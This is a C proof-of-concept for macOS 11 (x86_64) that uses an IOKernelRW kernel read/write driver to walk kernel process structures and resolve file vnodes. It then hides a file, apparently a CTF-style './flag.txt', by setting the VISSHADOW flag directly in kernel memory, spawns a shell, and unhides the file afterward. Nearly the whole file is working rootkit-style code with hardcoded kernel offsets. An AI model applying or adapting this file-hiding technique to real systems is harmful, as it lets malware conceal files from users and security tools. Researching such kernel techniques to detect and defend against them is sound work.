#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <iokernelrw.h>


//macOS 11.0.1 (x86_64)
//Darwin seos-Mac-2.local 20.1.0 Darwin Kernel Version 20.1.0: Sat Oct 31 00:07:31 PDT 2020; root:xnu-7195.50.7~2/DEVELOPMENT_X86_64 x86_64

#define KERNEL_BASE			0xffffff8000200000
#define KERNEL_SLIDE		0x10000
#define KERNEL_TEXT_BASE	0xffffff8000210000

#define PROCINIT			0xFFFFFF800095DB20 

#define VISSHADOW       0x008000        /* vnode is a shadow file */

uint32_t off_p_pid = 0x68;

uint32_t off_p_textvp = 0x2b0;
uint32_t off_vnode_v_name = 0xb8;
uint32_t off_vnode_v_parent = 0xc0;
uint32_t off_vnode_v_usecount = 0x60;
uint32_t off_vnode_v_iocount = 0x64;
uint32_t off_vnode_v_flag = 0x54;

uint32_t off_p_pfd = 0xf8;
uint32_t off_fp_glob = 0x18;
uint32_t off_fg_data = 0x38;

io_connect_t iokernelrw_client = MACH_PORT_NULL;
uint64_t allproc = 0;

kern_return_t kreadbuf(uint64_t addr, void *data, size_t size) {
    kern_return_t result = iokernelrw_read(iokernelrw_client, addr, data, size);

    return result;
}

uint32_t kread32(uint64_t address) {
    uint32_t output = 0;
    kern_return_t result;
    size_t bytesRead = 0;

    result = iokernelrw_read(iokernelrw_client, address, (void *)&output, sizeof(uint32_t));

    if (result != KERN_SUCCESS) {
        return 0;
    }

    return output;
}

uint64_t kread64(uint64_t address) {
    uint64_t output = 0;
    kern_return_t result;
    size_t bytesRead = 0;

    result = iokernelrw_read(iokernelrw_client, address, (void *)&output, sizeof(uint64_t));

    if (result != KERN_SUCCESS) {
        return 0;
    }

    return output;
}

kern_return_t kwrite64(uint64_t addr, uint64_t data) {
    return iokernelrw_write(iokernelrw_client, &data, addr, sizeof(uint64_t));
}

kern_return_t kwrite32(uint64_t addr, uint32_t data) {
    return iokernelrw_write(iokernelrw_client, &data, addr, sizeof(uint32_t));
}

void khexdump(uint64_t addr, size_t size) {
    void *data = malloc(size);
    kreadbuf(addr, data, size);
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", addr, i);
        }
        
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
    free(data);
}

uint64_t proc_of_pid(pid_t pid) {
    if(!allproc) return 0;

    uint64_t proc = kread64(allproc);
    uint64_t current_pid = 0;

    while (proc) {
        current_pid = kread32(proc + off_p_pid);
        if (current_pid == pid) return proc;
        proc = kread64(proc);
    }

    return 0;
}

uint64_t findRootVnode(uint64_t launchd_proc) {
    uint64_t textvp = kread64(launchd_proc + off_p_textvp);
    printf("[*] launchd proc->textvp: 0x%llx\n", textvp);

    uint64_t textvp_nameptr = kread64(textvp + off_vnode_v_name);
    uint64_t textvp_name = kread64(textvp_nameptr);
    printf("[*] launchd proc->textvp->v_name: %s\n", &textvp_name);
    
    uint64_t sbin_vnode = kread64(textvp + off_vnode_v_parent);
    textvp_nameptr = kread64(sbin_vnode + off_vnode_v_name);
    textvp_name = kread64(textvp_nameptr);
    printf("[*] launchd proc->textvp->v_parent->v_name: %s\n", &textvp_name);

    uint64_t root_vnode = kread64(sbin_vnode + off_vnode_v_parent);
    textvp_nameptr = kread64(root_vnode + off_vnode_v_name);
    printf("[*] launchd proc->textvp->v_parent->v_parent->v_name:\n");
    khexdump(textvp_nameptr, 16);
    
    return root_vnode;
}

uint64_t getVnodeAtPath(char* filename) {
    if(!allproc) return -1;

    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;

    uint64_t ourproc = proc_of_pid(getpid());
    uint64_t filedesc_ptr = kread64(ourproc + off_p_pfd);
    uint64_t filedesc = kread64(filedesc_ptr);
    uint64_t openedfile = kread64(filedesc + (8 * file_index));
    uint64_t fileglob = kread64(openedfile + off_fp_glob);
    uint64_t vnode = kread64(fileglob + off_fg_data);
    
    close(file_index);
    
    return vnode;
}

uint64_t hide_file(char* filename) {
    uint64_t vnode = getVnodeAtPath(filename);
    if(vnode == -1) {
        printf("[-] Unable to get vnode, path: %s", filename);
        return -1;
    }
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    printf("[*] vnode->usecount: %d, vnode->iocount: %d\n", usecount, iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //hide file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    printf("[*] vnode->v_flags: 0x%x\n", v_flags);
    kwrite32(vnode + off_vnode_v_flag, (v_flags | VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return vnode;
}

uint64_t reveal_file(uint64_t vnode) {
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    printf("[*] vnode->usecount: %d, vnode->iocount: %d\n", usecount, iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //show file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags &= ~VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return 0;
}

int main(void) {
	iokernelrw_client = iokernelrw_open();
	if (iokernelrw_client == MACH_PORT_NULL) {
        fprintf(stderr, "[-] Failed to open IOKernelRW service.\n");
        return 1;
    }
    printf("[*] IOKernelRW service opened successfully.\n");

    uint64_t procinit = PROCINIT + KERNEL_SLIDE;
	uint64_t pi_mov_allproc_0 = procinit + 4;
	uint64_t pi_mov_allproc_0_imm = (kread64(pi_mov_allproc_0) >> 24) & 0xFFFFFF;
	uint64_t pi_mov_allproc_0_instr_sz = 11;
	allproc = pi_mov_allproc_0 + pi_mov_allproc_0_instr_sz + pi_mov_allproc_0_imm;

	printf("[*] allproc is at: 0x%llx\n", allproc);

    uint64_t ourproc = proc_of_pid(getpid());
	printf("[*] ourproc is at: 0x%llx\n", ourproc);

	uint64_t launchd_proc = proc_of_pid(1);
	printf("[*] launchd_proc is at: 0x%llx\n", launchd_proc);

    uint64_t rootvnode = findRootVnode(launchd_proc);
    printf("[*] rootvnode = 0x%llx\n", rootvnode);




    
    const char* filename = "./flag.txt";
    printf("[*] %s access ret: %d\n", filename, access(filename, F_OK));

    uint64_t flag_vnode = hide_file(filename);
    printf("[*] Hide Success! flag_vnode = 0x%llx\n", flag_vnode);
    printf("[*] %s access ret: %d\n", filename, access(filename, F_OK));

    system("/bin/sh");

    uint64_t reveal_ret = reveal_file(flag_vnode);
    printf("[*] reveal_ret = 0x%llx\n", reveal_ret);
    printf("[*] %s access ret: %d\n", filename, access(filename, F_OK));


	IOServiceClose(iokernelrw_client);

	return 0;
}
